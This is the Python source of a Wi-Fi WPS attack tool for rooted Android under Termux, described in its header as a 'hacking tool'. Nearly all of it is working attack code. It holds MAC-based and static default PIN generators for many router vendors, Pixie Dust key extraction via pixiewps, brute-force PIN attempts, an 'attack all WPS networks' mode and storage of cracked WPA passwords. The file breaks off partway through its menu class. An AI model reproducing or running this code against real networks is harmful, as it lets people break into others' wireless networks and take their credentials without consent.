#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WiFiT - Professional WPS Penetration Testing Tool
Author: TuHiN
Version: 2.0.0

Designed for Rooted Android Devices with Termux
A hybrid WiFi hacking tool combining the best features from multiple sources.
For educational and authorized testing purposes only.
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
from datetime import datetime
import collections
import statistics
import csv
from pathlib import Path
from typing import Dict
import random
import threading
import queue
import hashlib
from concurrent.futures import ThreadPoolExecutor

try:
    from pyfiglet import Figlet
except ImportError:
    Figlet = None

try:
    import psutil
except ImportError:
    psutil = None


class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address must be string or integer')

    @property
    def string(self):
        return self._str_repr

    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self):
        return self._int_repr

    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self):
        return self.integer

    def __str__(self):
        return self.string

    def __iadd__(self, other):
        self.integer += other

    def __isub__(self, other):
        self.integer -= other

    def __eq__(self, other):
        return self.integer == other.integer

    def __ne__(self, other):
        return self.integer != other.integer

    def __lt__(self, other):
        return self.integer < other.integer

    def __gt__(self, other):
        return self.integer > other.integer

    @staticmethod
    def _mac2int(mac):
        return int(mac.replace(':', ''), 16)

    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper()
        mac = mac.zfill(12)
        mac = ':'.join(mac[i:i+2] for i in range(0, 12, 2))
        return mac

    def __repr__(self):
        return 'NetworkAddress(string={}, integer={})'.format(
            self._str_repr, self._int_repr)


class WPSpin:
    """WPS pin generator"""
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
                      'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
                      'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
                      'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
                      'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
                      'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
                      'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},
                      # Static pin algos
                      'pinEmpty': {'name': 'Empty PIN', 'mode': self.ALGO_EMPTY, 'gen': lambda mac: ''},
                      'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1234567},
                      'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2017252},
                      'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4626484},
                      'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7622990},
                      'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6232714},
                      'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 1086411},
                      'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3195719},
                      'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3043203},
                      'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 7141225},
                      'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6817554},
                      'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9566146},
                      'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9571911},
                      'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4856371},
                      'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 2085483},
                      'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 4397768},
                      'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 529417},
                      'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9995604},
                      'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3561153},
                      'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 6795814},
                      'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 3425928},
                      'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9422988},
                      'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': lambda mac: 9575521}}

    @staticmethod
    def checksum(pin):
        """Standard WPS checksum algorithm."""
        accum = 0
        while pin:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        """WPS pin generator"""
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Invalid WPS pin algorithm')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    def getAll(self, mac, get_static=True):
        """Get all WPS pin's for single MAC"""
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggested(self, mac):
        """Get all suggested WPS pin's for single MAC"""
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {}
            item['id'] = ID
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'Static PIN — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        """Get all suggested WPS pin's for single MAC as list"""
        algos = self._suggest(mac)
        res = []
        for algo in algos:
            res.append(self.generate(algo, mac))
        return res

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        if res:
            return res[0]
        else:
            return None

    def _suggest(self, mac):
        """Get algos suggestions for single MAC"""
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF'),
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def pin24(self, mac):
        return mac.integer & 0xFFFFFF

    def pin28(self, mac):
        return mac.integer & 0xFFFFFFF

    def pin32(self, mac):
        return mac.integer % 0x100000000

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) +
                ((pin & 0xF) << 8) +
                ((pin & 0xF) << 12) +
                ((pin & 0xF) << 16) +
                ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        mac.integer += 1
        return self.pinDLink(mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10)\
        + (((b[5] + b[0]) % 10) * 10)\
        + (((b[4] + b[5]) % 10) * 100)\
        + (((b[3] + b[4]) % 10) * 1000)\
        + (((b[2] + b[3]) % 10) * 10000)\
        + (((b[1] + b[2]) % 10) * 100000)\
        + (((b[0] + b[1]) % 10) * 1000000)
        return pin


def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()


class PixiewpsData:
    def __init__(self):
        self.pke = ''
        self.pkr = ''
        self.e_hash1 = ''
        self.e_hash2 = ''
        self.authkey = ''
        self.e_nonce = ''

    def clear(self):
        self.__init__()

    def got_all(self):
        return (self.pke and self.pkr and self.e_nonce and self.authkey
                and self.e_hash1 and self.e_hash2)

    def get_pixie_cmd(self, full_range=False):
        pixiecmd = "pixiewps --pke {} --pkr {} --e-hash1 {}"\
                    " --e-hash2 {} --authkey {} --e-nonce {}".format(
                    self.pke, self.pkr, self.e_hash1,
                    self.e_hash2, self.authkey, self.e_nonce)
        if full_range:
            pixiecmd += ' --force'
        return pixiecmd


class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
        self.bssid = ''

    def isFirstHalfValid(self):
        return self.last_m_message > 5

    def clear(self):
        self.__init__()


class BruteforceStatus:
    def __init__(self):
        self.start_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        self.mask = ''
        self.last_attempt_time = time.time()
        self.attempts_times = collections.deque(maxlen=15)
        self.total_attempts = 0
        self.successful_attempts = 0
        self.failed_attempts = 0
        self.counter = 0
        self.statistics_period = 5
        self.session_id = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]

    def display_status(self):
        average_pin_time = statistics.mean(self.attempts_times)
        if len(self.mask) == 4:
            percentage = int(self.mask) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.mask[4:]) / 11000)) * 100
        
        success_rate = (self.successful_attempts / max(self.total_attempts, 1)) * 100
        elapsed_time = time.time() - time.mktime(datetime.strptime(self.start_time, "%Y-%m-%d %H:%M:%S").timetuple())
        eta = (elapsed_time / max(percentage, 1)) * (100 - percentage) if percentage > 0 else 0
        
        print(f'[*] Progress: {percentage:.2f}% | Session: {self.session_id}')
        print(f'[*] Speed: {average_pin_time:.2f}s/pin | Success Rate: {success_rate:.1f}%')
        print(f'[*] ETA: {eta/60:.1f} min | Attempts: {self.total_attempts}')

    def registerAttempt(self, mask):
        self.mask = mask
        self.counter += 1
        current_time = time.time()
        self.attempts_times.append(current_time - self.last_attempt_time)
        self.last_attempt_time = current_time
        self.total_attempts += 1
        if self.counter == self.statistics_period:
            self.counter = 0
            self.display_status()

    def clear(self):
        self.__init__()


def check_root():
    """Check if script has root access"""
    if os.getuid() == 0:
        return True
    return False


def get_root_access():
    """Replace this process with a root WiFiT process."""
    if check_root():
        return True

    print(
        "\033[1;33m[*] Root access required. Attempting to elevate...\033[0m",
        flush=True,
    )

    prefix = os.environ.get('PREFIX') or '/data/data/com.termux/files/usr'
    python_candidates = [
        sys.executable,
        os.path.join(prefix, 'bin', 'python3'),
        shutil.which('python3'),
    ]
    python_path = None
    checked_paths = set()
    for candidate in python_candidates:
        if not candidate:
            continue
        if not os.path.isabs(candidate):
            candidate = shutil.which(candidate)
        if not candidate or candidate in checked_paths:
            continue
        checked_paths.add(candidate)
        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
            python_path = os.path.realpath(candidate)
            break

    if not python_path:
        print("\033[1;31m[-] Python 3 executable not found\033[0m")
        return False

    script_path = os.path.realpath(__file__)
    root_command = [python_path, script_path] + list(sys.argv[1:])

    # tsu accepts a USER positional argument, not a command.  The tsu package
    # installs a "sudo" alias specifically for one-shot commands and chooses
    # that mode from the invoked filename, so the sudo path must not be
    # resolved through its symlink to tsu.
    sudo_candidates = [
        os.path.join(prefix, 'bin', 'sudo'),
        shutil.which('sudo'),
    ]

    launch_errors = []
    attempted_paths = set()
    for sudo_path in sudo_candidates:
        if not sudo_path or sudo_path in attempted_paths:
            continue
        attempted_paths.add(sudo_path)
        if not (os.path.isfile(sudo_path) and os.access(sudo_path, os.X_OK)):
            continue
        try:
            sys.stdout.flush()
            sys.stderr.flush()
            os.execv(sudo_path, [sudo_path] + root_command)
        except OSError as error:
            launch_errors.append(error)

    # Raw Android su does not recreate the PATH, HOME, TMPDIR and linker
    # environment required by Termux programs.  Fail with repair guidance
    # instead of starting a partially configured root process.
    print("\033[1;31m[-] Failed to get root access\033[0m")
    if launch_errors:
        print("\033[1;31m[-] Elevation command failed: {}\033[0m".format(
            launch_errors[-1]))
    print("\033[1;33m[!] Install/reinstall tsu with: pkg install root-repo tsu\033[0m")
    print("\033[1;33m[!] Then run wifit again and grant root permission\033[0m")
    return False


def display_cracked_result(pin, psk, ssid):
    """Display result in beautiful box format"""
    box_width = 64
    print("\n")
    print("\033[1;36m┌─[ WiFiT ]───[ CRACKED ]" + "─" * (box_width - 25) + "┐\033[0m")
    print("\033[1;36m│\033[0m" + " " * (box_width - 2) + "\033[1;36m│\033[0m")
    print(f"\033[1;36m│\033[0m \033[1;32mPIN\033[0m  : \033[1;37m{pin:<{box_width - 10}}\033[0m\033[1;36m│\033[0m")
    print(f"\033[1;36m│\033[0m \033[1;33mPSK\033[0m  : \033[1;33m{psk:<{box_width - 10}}\033[0m\033[1;36m│\033[0m")
    print(f"\033[1;36m│\033[0m \033[1;37mSSID\033[0m : \033[1;37m{ssid:<{box_width - 10}}\033[0m\033[1;36m│\033[0m")
    print("\033[1;36m│\033[0m" + " " * (box_width - 2) + "\033[1;36m│\033[0m")
    print("\033[1;36m└─[ Stay With TuHiN ]" + "─" * (box_width - 21) + "┘\033[0m")
    print()


def show_wifit_banner():
    """Display WiFiT branded banner"""
    current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    banner = f"""
\033[1;36m╔══════════════════════════════════════════════════════════════╗
║                    🛡️  WiFiT v2.0.0                         ║
║         Professional WPS Testing Toolkit for Termux          ║
║                      Author: TuHiN                           ║
╠══════════════════════════════════════════════════════════════╣
║  Time: {current_time}                      ║
║  Platform: Rooted Android + Termux                          ║
║  GitHub: https://github.com/TuHiN22/WiFiT                   ║
╚══════════════════════════════════════════════════════════════╝\033[0m
    """
    print(banner)


def show_main_menu():
    """Display main menu"""
    menu = """
\033[1;32m╔══════════════════════════════════════════════════════════════╗
║                      🎯 WiFiT Main Menu                     ║
╠══════════════════════════════════════════════════════════════╣
║  [1] 🚀 Auto Attack - Scan & Attack All WPS Networks        ║
║  [2] 🎯 Pixie Dust Attack - Fast WPS PIN Recovery           ║
║  [3] 💪 Brute Force Attack - Systematic PIN Testing         ║
║  [4] 🤖 Smart PIN Attack - AI-Enhanced Recovery             ║
║  [5] 📋 View Saved Passwords                                ║
║  [6] 🔧 Fix Root Issues - Repair Superuser Access           ║
║  [7] 🚪 Exit                                                ║
╚══════════════════════════════════════════════════════════════╝\033[0m
    """
    print(menu)


class Companion:
    """Main WPS attack handler"""
    def __init__(self, interface, save_result=True, print_debug=False):
        self.interface = interface
        self.save_result = save_result
        self.print_debug = print_debug

        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = f"{self.tempdir}/{interface}"
        self.__init_wpa_supplicant()

        self.res_socket_file = f"{tempfile._get_default_tempdir()}/{next(tempfile._get_candidate_names())}"
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)

        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()

        user_home = str(pathlib.Path.home())
        self.sessions_dir = f'{user_home}/.WiFiT/sessions/'
        self.pixiewps_dir = f'{user_home}/.WiFiT/pixiewps/'
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        
        for directory in [self.sessions_dir, self.pixiewps_dir, self.reports_dir]:
            if not os.path.exists(directory):
                os.makedirs(directory)

        self.generator = WPSpin()

    def __init_wpa_supplicant(self):
        print('[*] Running wpa_supplicant…')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        while True:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant returned an error')
            if os.path.exists(self.wpas_ctrl_path):
                break
            time.sleep(.1)

    def sendOnly(self, command):
        """Sends command to wpa_supplicant"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        """Sends command to wpa_supplicant and returns the reply"""
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        (b, address) = self.retsock.recvfrom(4096)
        inmsg = b.decode('utf-8', errors='replace')
        return inmsg

    def __handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        line = self.wpas.stdout.readline()
        if not line:
            self.wpas.wait()
            return False
        line = line.rstrip('\n')

        if verbose:
            sys.stderr.write(line + '\n')

        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                n = int(line.split('Building Message M')[1].replace('D', ''))
                self.connection_status.last_m_message = n
                print('[*] Sending WPS Message M{}…'.format(n))
            elif 'Received M' in line:
                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                print('[*] Received WPS Message M{}'.format(n))
                if n == 5:
                    print('[+] The first half of the PIN is valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                print('[*] Received WSC NACK')
                print('[-] Error: wrong PIN code')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    print('[P] E-Nonce: {}'.format(self.pixie_creds.e_nonce))
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    print('[P] PKR: {}'.format(self.pixie_creds.pkr))
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    print('[P] PKE: {}'.format(self.pixie_creds.pke))
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    print('[P] AuthKey: {}'.format(self.pixie_creds.authkey))
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    print('[P] E-Hash1: {}'.format(self.pixie_creds.e_hash1))
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    print('[P] E-Hash2: {}'.format(self.pixie_creds.e_hash2))
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                print('[*] Scanning…')
        elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
            self.connection_status.status = 'WPS_FAIL'
            print('[-] wpa_supplicant returned WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Authenticating…')
        elif 'Authentication response' in line:
            print('[+] Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
            print('[*] Associating with AP…')
        elif ('Associated with' in line) and (self.interface in line):
            bssid = line.split()[-1].upper()
            if self.connection_status.essid:
                print('[+] Associated with {} (ESSID: {})'.format(bssid, self.connection_status.essid))
            else:
                print('[+] Associated with {}'.format(bssid))
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            print('[*] Sending EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            print('[*] Received Identity Request')
        elif 'using real identity' in line:
            print('[*] Sending Identity Response…')
        elif pbc_mode and ('selected BSS ' in line):
            bssid = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bssid
            print('[*] Selected AP: {}'.format(bssid))

        return True

    def __runPixiewps(self, showcmd=False, full_range=False):
        print("[*] Running Pixiewps…")
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            print(cmd)
        r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                           stderr=sys.stdout, encoding='utf-8', errors='replace')
        print(r.stdout)
        if r.returncode == 0:
            lines = r.stdout.splitlines()
            for line in lines:
                if ('[+]' in line) and ('WPS pin' in line):
                    pin = line.split(':')[-1].strip()
                    if pin == '<empty>':
                        pin = "''"
                    return pin
        return False

    def __saveResult(self, bssid, essid, wps_pin, wpa_psk):
        if not os.path.exists(self.reports_dir):
            os.makedirs(self.reports_dir)
        filename = self.reports_dir + 'WiFiT_Results'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as file:
            file.write('═══════════════════════════════════════\n')
            file.write('WiFiT Attack Result - {}\n'.format(dateStr))
            file.write('═══════════════════════════════════════\n')
            file.write('BSSID: {}\n'.format(bssid))
            file.write('ESSID: {}\n'.format(essid))
            file.write('WPS PIN: {}\n'.format(wps_pin))
            file.write('WPA PSK: {}\n'.format(wpa_psk))
            file.write('═══════════════════════════════════════\n\n')
        
        writeTableHeader = not os.path.isfile(self.reports_dir + 'stored.csv')
        with open(self.reports_dir + 'stored.csv', 'a', newline='', encoding='utf-8') as file:
            csvWriter = csv.writer(file, delimiter=';', quoting=csv.QUOTE_ALL)
            if writeTableHeader:
                csvWriter.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            csvWriter.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        print(f'[+] Credentials saved to {filename}.txt')

    def __wps_connection(self, bssid=None, pin=None, pixiemode=False, pbc_mode=False, verbose=None):
        if not verbose:
            verbose = self.print_debug
        self.pixie_creds.clear()
        self.connection_status.clear()
        self.wpas.stdout.read(300)
        
        if pbc_mode:
            if bssid:
                print(f"[*] Starting WPS push button connection to {bssid}…")
                cmd = f'WPS_PBC {bssid}'
            else:
                print("[*] Starting WPS push button connection…")
                cmd = 'WPS_PBC'
        else:
            print(f"[*] Trying PIN '{pin}'…")
            cmd = f'WPS_REG {bssid} {pin}'
        
        r = self.sendAndReceive(cmd)
        if 'OK' not in r:
            self.connection_status.status = 'WPS_FAIL'
            print('[!] WPS command failed')
            return False

        while True:
            res = self.__handle_wpas(pixiemode=pixiemode, pbc_mode=pbc_mode, verbose=verbose)
            if not res:
                break
            if self.connection_status.status == 'WSC_NACK':
                break
            elif self.connection_status.status == 'GOT_PSK':
                break
            elif self.connection_status.status == 'WPS_FAIL':
                break

        self.sendOnly('WPS_CANCEL')
        return False

    def single_connection(self, bssid=None, pin=None, pixiemode=False):
        if not pin:
            if pixiemode:
                pin = self.generator.getLikely(bssid) or '12345670'
            else:
                pin = '12345670'
        
        self.__wps_connection(bssid, pin, pixiemode)

        if self.connection_status.status == 'GOT_PSK':
            # Display beautiful result box
            display_cracked_result(pin, self.connection_status.wpa_psk, self.connection_status.essid)
            
            # Save results
            self.__saveResult(bssid, self.connection_status.essid, pin, self.connection_status.wpa_psk)
            
            # Show save confirmation
            print(f"\033[1;33m[+] Saved → reports/WiFiT_saved_data.txt\033[0m")
            print(f"\033[1;37m[i] Credentials saved to reports/WiFiT_Results.txt, reports/stored.csv\033[0m\n")
            
            return True
        elif pixiemode:
            if self.pixie_creds.got_all():
                pin = self.__runPixiewps(False, False)
                if pin:
                    return self.single_connection(bssid, pin, pixiemode=False)
        return False

    def smart_bruteforce(self, bssid, delay=1.0):
        """Smart brute force with generated PINs"""
        print("[*] Starting smart brute force attack...")
        tried_pins = set()
        self.bruteforce = BruteforceStatus()
        
        # Try suggested PINs first
        suggested = self.generator.getSuggestedList(bssid)
        for pin in suggested:
            if pin in tried_pins:
                continue
            tried_pins.add(pin)
            self.bruteforce.registerAttempt(pin)
            self.single_connection(bssid, pin)
            if self.connection_status.status == 'GOT_PSK':
                return True
            time.sleep(delay)
        
        # Random PIN generation
        for _ in range(1000):
            base_pin = random.randint(0, 9999999)
            base_pin_str = str(base_pin).zfill(7)
            checksum = self.generator.checksum(int(base_pin_str))
            pin = base_pin_str + str(checksum)
            
            if pin in tried_pins:
                continue
            tried_pins.add(pin)
            self.bruteforce.registerAttempt(pin)
            self.single_connection(bssid, pin)
            if self.connection_status.status == 'GOT_PSK':
                return True
            time.sleep(delay)
        
        return False

    def cleanup(self):
        self.retsock.close()
        self.wpas.terminate()
        os.remove(self.res_socket_file)
        shutil.rmtree(self.tempdir, ignore_errors=True)
        os.remove(self.tempconf)


class WiFiScanner:
    """WiFi network scanner"""
    def __init__(self, interface):
        self.interface = interface
        
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as file:
                csvReader = csv.reader(file, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = []
                for row in csvReader:
                    self.stored.append((row[1], row[2]))
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self) -> Dict[int, dict]:
        """Parsing iw scan results"""
        def handle_network(line, result, networks):
            networks.append({
                'Security type': 'Unknown',
                'WPS': False,
                'WPS locked': False,
                'Model': '',
                'Device name': ''
            })
            networks[-1]['BSSID'] = result.group(1).upper()

        def handle_essid(line, result, networks):
            d = result.group(1)
            networks[-1]['ESSID'] = codecs.decode(d, 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')

        def handle_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))

        def handle_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)

        def handle_wpsLocked(line, result, networks):
            flag = int(result.group(1), 16)
            if flag:
                networks[-1]['WPS locked'] = True

        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): handle_network,
            re.compile(r'SSID: (.*)'): handle_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): handle_level,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): handle_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): handle_wpsLocked,
        }

        for line in lines:
            if line.startswith('command failed:'):
                print('[!] Error:', line)
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = list(filter(lambda x: bool(x['WPS']), networks))
        if not networks:
            return False

        networks.sort(key=lambda x: x.get('Level', -100), reverse=True)
        network_list = {(i + 1): network for i, network in enumerate(networks)}

        # Print networks
        print('\n\033[1;33mWPS-Enabled Networks:\033[0m')
        print('{:<4} {:<18} {:<25} {:<8} {:<}'.format('#', 'BSSID', 'ESSID', 'PWR', 'Status'))
        print('─' * 70)
        
        for n, network in network_list.items():
            number = f'{n})'
            essid = network['ESSID'][:25]
            status = '\033[1;31mLOCKED\033[0m' if network['WPS locked'] else '\033[1;32mOPEN\033[0m'
            if (network['BSSID'], network['ESSID']) in self.stored:
                status = '\033[1;33mSTORED\033[0m'
            
            line = '{:<4} {:<18} {:<25} {:<8} {}'.format(
                number, network['BSSID'], essid, network.get('Level', 'N/A'), status)
            print(line)

        return network_list


class MenuHandler:
    """Interactive menu system"""
    def __init__(self):
        self.interface = self._get_wifi_interface()
        
    def _get_wifi_interface(self):
        """Detect WiFi interface"""
        try:
            result = subprocess.run("ip link show", shell=True, capture_output=True, text=True)
            output = result.stdout
            
            for interface in ["wlan0", "wlo1", "wlp2s0"]:
                if interface in output:
                    return interface
            return "wlan0"
        except:
            return "wlan0"
    
